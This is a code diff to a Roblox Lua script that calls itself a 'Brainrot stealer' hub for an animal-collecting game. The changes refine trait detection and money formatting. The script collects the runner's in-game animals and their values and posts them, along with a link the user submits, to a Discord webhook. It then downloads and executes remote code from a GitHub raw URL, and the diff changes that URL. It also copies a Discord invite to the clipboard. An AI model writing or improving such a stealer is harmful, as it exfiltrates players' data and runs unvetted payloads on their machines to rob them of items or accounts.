@@ -1,4 +1,4 @@
--- === ARTIFAKT 2: MAIN HUB + BRAINROT STEALER (dinooo.txt) ===
+-- === ARTIFAKT 2: MAIN HUB + BRAINROT STEALER (FIXED TRAIT DETECTION) ===
 pcall(function() setclipboard("https://discord.gg/rvZndRfkyX") end)
 
 local ALLOWED_PLACE_ID = 109983668079237
@@ -8,7 +8,6 @@ if game.PlaceId ~= ALLOWED_PLACE_ID then
 end
 
 local Webhook1 = Webhook or ""
-local AuthorisedUsers = AuthorisedUsers or {"nothing lol"}
 local Ping = Ping or "10m"
 local Username = "voxium script .gg/59XeEXRe"
 
@@ -45,43 +44,43 @@ local COLORS = {
     warn = Color3.fromRGB(255,120,120),
 }
 
--- === NEW TRAIT MAP ===
+-- === TRAIT ICON TO NAME MAP (FIXED: assetid as string key) ===
 local traitMap = {
-    ["rbxassetid://89041930759464"] = "Taco",
-    ["rbxassetid://104229924295526"] = "Nyan",
-    ["rbxassetid://99181785766598"] = "Galactic",
-    ["rbxassetid://121100427764858"] = "Fireworks",
-    ["rbxassetid://110723387483939"] = "Zombie",
-    ["rbxassetid://104964195846833"] = "Claws",
-    ["rbxassetid://121332433272976"] = "Glitched",
-    ["rbxassetid://100601425541874"] = "Bubblegum",
-    ["rbxassetid://118283346037788"] = "Fire",
-    ["rbxassetid://78474194088770"] = "Wet",
-    ["rbxassetid://83627475909869"] = "Snowy",
-    ["rbxassetid://127455440418221"] = "Cometstruck",
-    ["rbxassetid://97725744252608"] = "Explosive",
-    ["rbxassetid://82620342632406"] = "Disco",
-    ["rbxassetid://134655415681926"] = "10B",
-    ["rbxassetid://104985313532149"] = "Shark Fin",
-    ["rbxassetid://115664804212096"] = "Matteo Hat",
-    ["rbxassetid://75650816341229"] = "Brazil",
-    ["rbxassetid://115001117876534"] = "Sleepy",
-    ["rbxassetid://139729696247144"] = "Lightning",
-    ["rbxassetid://110910518481052"] = "UFO",
-    ["rbxassetid://117478971325696"] = "Spider",
-    ["rbxassetid://84731118566493"] = "Strawberry",
-    ["rbxassetid://119591742504251"] = "Paint",
-    ["rbxassetid://89591838221335"] = "Skeleton",
-    ["rbxassetid://95128039793845"] = "Sombrero",
-    ["rbxassetid://103610037004911"] = "Tie",
-    ["rbxassetid://123964048606874"] = "Witch Hat",
-    ["rbxassetid://93350414974589"] = "Indonesia",
-    ["rbxassetid://114748221761549"] = "Meowl",
-    ["rbxassetid://123115843719383"] = "RIP Gravestone",
-    ["rbxassetid://97054765273857"] = "Jackolantern Pet",
+    ["89041930759464"] = "Taco",
+    ["104229924295526"] = "Nyan",
+    ["99181785766598"] = "Galactic",
+    ["121100427764858"] = "Fireworks",
+    ["110723387483939"] = "Zombie",
+    ["104964195846833"] = "Claws",
+    ["121332433272976"] = "Glitched",
+    ["100601425541874"] = "Bubblegum",
+    ["118283346037788"] = "Fire",
+    ["78474194088770"] = "Wet",
+    ["83627475909869"] = "Snowy",
+    ["127455440418221"] = "Cometstruck",
+    ["97725744252608"] = "Explosive",
+    ["82620342632406"] = "Disco",
+    ["134655415681926"] = "10B",
+    ["104985313532149"] = "Shark Fin",
+    ["115664804212096"] = "Matteo Hat",
+    ["75650816341229"] = "Brazil",
+    ["115001117876534"] = "Sleepy",
+    ["139729696247144"] = "Lightning",
+    ["110910518481052"] = "UFO",
+    ["117478971325696"] = "Spider",
+    ["84731118566493"] = "Strawberry",
+    ["119591742504251"] = "Paint",
+    ["89591838221335"] = "Skeleton",
+    ["95128039793845"] = "Sombrero",
+    ["103610037004911"] = "Tie",
+    ["123964048606874"] = "Witch Hat",
+    ["93350414974589"] = "Indonesia",
+    ["114748221761549"] = "Meowl",
+    ["123115843719383"] = "RIP Gravestone",
+    ["97054765273857"] = "Jackolantern Pet",
 }
 
--- === BRAINROT FETCH FROM PLOTCONTROLLER ===
+-- === BRAINROT FETCH + TRAIT DETECTION (FIXED) ===
 local Plot = require(ReplicatedStorage.Controllers.PlotController)
 local gen = require(ReplicatedStorage.Shared.Animals)
 local myPlot = Plot:GetMyPlot()
@@ -90,9 +89,25 @@ local function getAllBrainrots()
     local list = {}
     for _, brainrot in pairs(myPlot.Channel:Get("AnimalList")) do
         local amount = gen:GetGeneration(brainrot.Index, brainrot.Mutation)
-        local name = brainrot.Index
-        if name then
-            table.insert(list, {name = name, moneyPerSec = amount})
+        local baseName = brainrot.Index
+
+        -- === TRAIT DETECTION FROM MUTATION (Icon) ===
+        local traitName = "None"
+        if brainrot.Mutation and brainrot.Mutation:FindFirstChild("Icon") then
+            local icon = brainrot.Mutation.Icon
+            local assetId = tostring(icon.Image):match("%d+$")
+            if assetId and traitMap[assetId] then
+                traitName = traitMap[assetId]
+            end
+        end
+
+        local fullName = baseName
+        if traitName ~= "None" then
+            fullName = baseName .. " (" .. traitName .. ")"
+        end
+
+        if baseName then
+            table.insert(list, {name = fullName, moneyPerSec = amount, trait = traitName})
         end
     end
     table.sort(list, function(a,b) return a.moneyPerSec > b.moneyPerSec end)
@@ -104,11 +119,11 @@ local function parsePingValue(p) local n,s=p:match("(%d+)([kmb]?)") n=tonumber(n
 local pingThreshold = parsePingValue(Ping)
 
 local function formatMoney(v)
-    if v>=1e12 then return string.format("$%.1fT/s",v/1e12)
-    elseif v>=1e9 then return string.format("$%.1fB/s",v/1e9)
-    elseif v>=1e6 then return string.format("$%.1fM/s",v/1e6)
-    elseif v>=1e3 then return string.format("$%.1fK/s",v/1e3)
-    else return string.format("$%.1f/s",v) end
+    if v>=1e12 then return string.format("%.2fT/s",v/1e12)
+    elseif v>=1e9 then return string.format("%.2fB/s",v/1e9)
+    elseif v>=1e6 then return string.format("%.2fM/s",v/1e6)
+    elseif v>=1e3 then return string.format("%.2fK/s",v/1e3)
+    else return string.format("%.0f/s",v) end
 end
 
 local function hasHighValue(b) for _,d in ipairs(b) do if d.moneyPerSec >= pingThreshold then return true end end return false end
@@ -134,7 +149,7 @@ local function sendWebhook(brainrots, link)
     if req then pcall(function() req({Url=Webhook1, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)}) end) end
 end
 
--- === UI (NO ANIMATIONS, DRAGGABLE) ===
+-- === UI (NO ANIMATIONS EXCEPT BUTTON HOVER) ===
 local Holder = Instance.new("Frame", SG)
 Holder.AnchorPoint = Vector2.new(0.5,0.5)
 Holder.Position = UDim2.fromScale(0.5,0.5)
@@ -167,7 +182,7 @@ UserInputService.InputChanged:Connect(function(i)
     if i == dragInput and dragging then update(i) end
 end)
 
--- Top
+-- Top UI
 local Top = Instance.new("Frame", Holder)
 Top.BackgroundTransparency = 1
 Top.Size = UDim2.new(1,-32,0,80)
@@ -312,5 +327,5 @@ BtnSubmit.MouseButton1Click:Connect(function()
     local brainrots = getAllBrainrots()
     sendWebhook(brainrots, link)
     SG:Destroy()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/dinoscripts2334/extern-script/refs/heads/main/Extern"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Spv-Script/asad/refs/heads/main/a"))()
 end)
